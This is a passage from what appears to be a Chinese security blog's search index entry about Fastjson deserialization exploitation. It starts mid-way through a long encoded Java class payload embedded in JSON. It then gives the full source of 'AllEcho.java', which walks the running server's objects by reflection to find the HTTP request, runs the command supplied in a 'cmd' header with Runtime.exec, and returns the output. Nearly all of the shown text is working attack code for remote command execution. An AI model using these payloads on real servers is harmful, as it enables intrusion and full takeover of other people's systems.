3f$e3$_$g$fe$8a$bf$J$a8$e9$94$be$7d$7c$z$d0$f0w$R$bb$7f$e09$a6$de$84$b5$89$85b$fbM2$a3$f0$F$b6$98$9e$Z$ab$3a$9d$T$e5$m$F$8ey$a5$e3kwY$86r$3f$b9W8$cf$z$91$ed$b6n$98c$e0$d3$dem$T$7dLh$pa$dbf$cc$Z$9dO$zMg$e5$ad$92$97b$d0F$3d$S$a3x$9f$deI$3a$85$d1J$e93$a54$93$f4$fcH$bc$$$k$X$f7$hKs$83m$f5$I$de$e3$e8DM$W$81$f7$A$qaU$G$db$b6$8f$3fu$b3$w$3c$fd$85$f6$I$bf$I1$bd$87$8eX$96$a1$dag$IzY$a6$bb0$3d7$P$c4$j$b3$c7$bb$pZm$ab$d7$b4$9d$D$y$x$T$c4$e7$fau$9b$ebXMV$9fi$d7$eb$e2j$Z$eb$f9$ebD$rc$9c$c6z$k$W$b5$yf$98$ae$ef$K$fe$b7$d7$96$889$RQ$e7Uqc$8dNBc$b8$a6$96$c5$3dk$ee7$N$be$3a$s$d0$95V$89JQ$3bFRjQ$c2$qJj$8c$f5$s$I2$e2$84$8e$u$i$95$c6$d4M$db$e0$f1$f2$d2$8c$h$Z$a4$f3$ce$d5$Sqs$8d$Z$8d$f4xy$7f$T$r$d3$8b$81$b0$wf$ee$e7$8d$p$bb$c8$8f$c6nx$H$a4I$I$ec$8a$s$e2$bc$ea$CF$d4$S$ce$_$a0$rk$d2$af6Z7$a3$b4$ecfI$9c$c7$8b$d5$ab$a3$R$f7$89$e3$_$dd$s8$fb$c8$e9$G$M$dc$MM2$d3$c4$b6$f5$D$ee$b3$8a$B$cd$e3$f1p$82H2$bc$e4$K$89$3cc$ee$d1$ae1$F$a1h$7c$d2$a5$5e$80$98$c5gh1$9f$e52$UqCB$c2Z$ce$b2$d0$c09$_K$8e$Vq$ff$b9$fd$86T$cf$db$c3$edy$df$ba$7d$ab$db$Hx$96$d70$db0gI$f2$c8b$bf$bc$fc$i$qi$IY$fc$7c$X$e0$dfz$O$81$nd$PB$O$wI$e4$MA$V$c3$5cw$a8$N$40iZ$90$c4$a4aL$f6$N$p$ff$yyMC$F$l$d4y$f0$a1$9d$dc$aa$90$cbv2$9f$fc$F$94$h$84$86$v$a4$I$d1$KAWD$caB$y$e4$83$7d$JJP$8b$Z$d8D$eai$d4c$nOl$c6$W$f2$a3F$b8$H$5b$d9o$e3$97$8f$ac$e7yH$92$b1$5d4$3b$fcP$c5$dd$cb$Ta$97$o$cb$3dQ$5c$3e$82$bcAd$97$tQp$M$B$ff$Zo$i$dc$e2$3b$c3$5dO$b3$m$r$A$b7a$S$ffS$e4c$Ou$98$ebJ$d7$3c$Ox$b9$eb$p$n$d3$8f$acI$Sv$K$8fI$5c$GE$f2$o$f1Df$3d$82l$c1H$aa$y$c9_r$g$93$H$915$o$3c$e4$h$81$ffl$f90$a6$i$97B$5c$bb$8c$87$G$a1R$85$a9I$84$8e$e1$409$fd$cb$85$e04$ffS$u$dc$ea$LN$P$tQT$ceI1$t$r$9c$cc$b8$84$e9C$b8e$Q$b7$5c$86$w$a21$802$f2$n$83$e0$ad$3e$9e$nys$F$X8$$$s5C$c5P4$7b$84$8b$9b$x$92$985$80r$d1$cf$Z$c0l$d1$cf$h$401$d5$ba$8c$a9$83$d0$ae$x$oS$R$9f$abs$b7$absG$f0$f6a$ccO$a24X$96D$f91$u$c1$F$D$I$E$x$9ay$uX$99$SL$ca$94$d8K$a8j$a9$bc$80$ea$ad$c3XHU$93X$94$c4$e2$8asxQpI$Sw$q$b14$89$3b$x$93$b8$8b$df$b2$B$f8$9b$cf$96$97$f8w$ba8$J$a0$D$P$e0$m$fd$bf$I$P$e3Q$c6$40$f4G$f8$bfN$f4$t$Y$8b$Ri$a64$87$fb$5e$b4$k$e7$K0$9fQ$x$r$82$ca$Z$9f$F$a8$q$82$W$R$M$9b$88$96$ed$iu$e0$O$d8XJ$be$b5$e4$7c$t$fa$b1$8c$bc$ea$c9$fdn$i$c2$K$3c$c6$f1$R$ac$c4Q$ac$c2$T$i$9f$40$jN2$9b$9e$e4$f84$b3$u$c9$i$3a$cf$8c$Za$be$5ca$c6$5cE$8b4$9d$8f$d3$Zh$95f$oLm$da$a4$b9h$97$e6a$8bTAD$K$b4$ec$40$OeN$a2l$83$80$e8wQ$db$c9$d1$nwdrt$d4$j$ed$e2$e8$a4$3b$ea$e2$e8$K$a5vSB$We$94$o$82$dd$b4$92$Q$c2$k$Xsb$UE$Pq$u$d0W$8a$fc$m$fe$85$96$9d2b$fe$d52$acu2z$f9$ed$95$a7$cd$ac$93a$3f$87$b5$dc$Ba$u$Q$9a$93E$s$e0q$81$d2$f8$uJ$a5$7b$d8k$5c$eb$X$91$Xp$a8i$a9$bc$b8$d4$ef$5b$g$I$FB$feS0$xC$81$c55$d9E$d9$fe$qj$a5$g$b9H$a4$cbr$f6$b2$8b$94$bb$8fC$x$92K$86$b1b$A$d5E$f2$r$ac$e4$afF$vR$$$$$cd$f1$zUCj$u$e7$U$a6$V$v$nuqMnQ$ae$m$ecW$a5$81$e7$9f$rxj$94$fe$A$87$c7$vt$d5$d6$e6$cb$cf$3f$u$8a$c4$7cXt$dbhpW3$B$85$x$DL$e4$5b$99asi$ca$7c$ba$b4$9a$ae$ac$a1$T$eb$e94$83$O$8b$b0$b7h$abM$e78$a4$bd$X$7bq$lg$H9$T$c1XA$t$Y$fc$i$ba1$97$i$9a$5d$87$ca$e4$b9$Z$J$ec$e3$O$3d$80$3e$cf$c9$iyN$O$e0$7e$ecg$d8$b3$5cwWA$f97$C2$O$5cC$ae$8c$7b$r$e9$3fX$q$e3$3e$Z$af$b8$86$C$Z$x$r$e9$w$8a$Y$86$d8$3f$c1Q$60$d4$e9$7d$v$a7$xx$e5$f5$8a$3a$db$ad$q$M$E$abc$SuC$90$cf$8a$e0$ba$sg$bb$7b$K$dbW$b9$d5$fb$fe$ff$Ctz$ebem$R$A$A&quot;            &#125;        &#125; : &quot;xxx&quot;    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>AllEcho.java å¯¹äºå…¶ä»–çš„ä¸­é—´ä»¶çš„å…¼å®¹æ•ˆæœæ¯”è¾ƒå¥½ã€‚</p><pre class="line-numbers language-none"><code class="language-none">public class AllEcho &#123;    static java.util.HashSet&lt;Object&gt; h;    static ClassLoader cl &#x3D; java.lang.Thread.currentThread().getContextClassLoader();    static Class hsr;&#x2F;&#x2F;HTTPServletRequest.class    static Class hsp;&#x2F;&#x2F;HTTPServletResponse.class    static String cmd;    static Object r;    static Object p;    public AllEcho() &#123;        r &#x3D; null;        p &#x3D; null;        h &#x3D;new java.util.HashSet&lt;Object&gt;();        try &#123;            hsr &#x3D; cl.loadClass(&quot;javax.servlet.http.HttpServletRequest&quot;);            hsp &#x3D; cl.loadClass(&quot;javax.servlet.http.HttpServletResponse&quot;);        &#125; catch (ClassNotFoundException e) &#123;            e.printStackTrace();        &#125;        F(java.lang.Thread.currentThread(),0);    &#125;    private static boolean i(Object obj)&#123;        if(obj&#x3D;&#x3D;null|| h.contains(obj))&#123;            return true;        &#125;        h.add(obj);        return false;    &#125;    private static void p(Object o, int depth)&#123;        if(depth &gt; 52||(r !&#x3D;null&amp;&amp; p !&#x3D;null))&#123;            return;        &#125;        if(!i(o))&#123;            if(r &#x3D;&#x3D;null&amp;&amp;hsr.isAssignableFrom(o.getClass()))&#123;                r &#x3D; o;                &#x2F;&#x2F;Tomcatç‰¹æ®Šå¤„ç†                try &#123;                    cmd &#x3D; (String)hsr.getMethod(&quot;getHeader&quot;,new Class[]&#123;String.class&#125;).invoke(o,&quot;cmd&quot;);                    if(cmd&#x3D;&#x3D;null) &#123;                        r &#x3D; null;                    &#125;else&#123;                        &#x2F;&#x2F;System.out.println(&quot;find Request&quot;);                        try &#123;                            java.lang.reflect.Method getResponse &#x3D; r.getClass().getMethod(&quot;getResponse&quot;);                            p &#x3D; getResponse.invoke(r);                        &#125; catch (Exception e) &#123;                            &#x2F;&#x2F;System.out.println(&quot;getResponse Error&quot;);                            r&#x3D;null;                            &#x2F;&#x2F;e.printStackTrace();                        &#125;                    &#125;                &#125; catch (IllegalAccessException e) &#123;                    e.printStackTrace();                &#125; catch (java.lang.reflect.InvocationTargetException e) &#123;                    e.printStackTrace();                &#125; catch (NoSuchMethodException e) &#123;                    e.printStackTrace();                &#125;            &#125;else if(p &#x3D;&#x3D;null&amp;&amp;hsp.isAssignableFrom(o.getClass()))&#123;                p &#x3D;  o;            &#125;            if(r !&#x3D;null&amp;&amp; p !&#x3D;null)&#123;                try &#123;                    String charsetName &#x3D; System.getProperty(&quot;os.name&quot;).toLowerCase().contains(&quot;window&quot;) ? &quot;GBK&quot;:&quot;UTF-8&quot;;                    java.io.PrintWriter pw &#x3D;  (java.io.PrintWriter)hsp.getMethod(&quot;getWriter&quot;).invoke(p);                    pw.println(new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream(),charsetName).useDelimiter(&quot;\\A&quot;).next());                    pw.flush();                    pw.close();                    &#x2F;&#x2F;p.addHeader(&quot;out&quot;,new Scanner(Runtime.getRuntime().exec(r.getHeader(&quot;cmd&quot;)).getInputStream()).useDelimiter(&quot;\\A&quot;).next());                &#125;catch (Exception e)&#123;                &#125;                return;            &#125;            F(o,depth+1);        &#125;    &#125;    private static void F(Object start, int depth)&#123;        Class n&#x3D;start.getClass();        do&#123;            for (java.lang.reflect.Field declaredField : n.getDeclaredFields()) &#123;                declaredField.setAccessible(true);                Object o &#x3D; null;                try&#123;                    o &#x3D; declaredField.get(start);                    if(!o.getClass().isArray())&#123;                        p(o,depth);                    &#125;else&#123;                        for (Object q : (Object[]) o) &#123;                            p(q, depth);                        &#125;                    &#125;                &#125;catch (Exception e)&#123;                &#125;            &#125;        &#125;while(                (n &#x3D; n.getSuperclass())!&#x3D;null        );    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> Fastjson </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
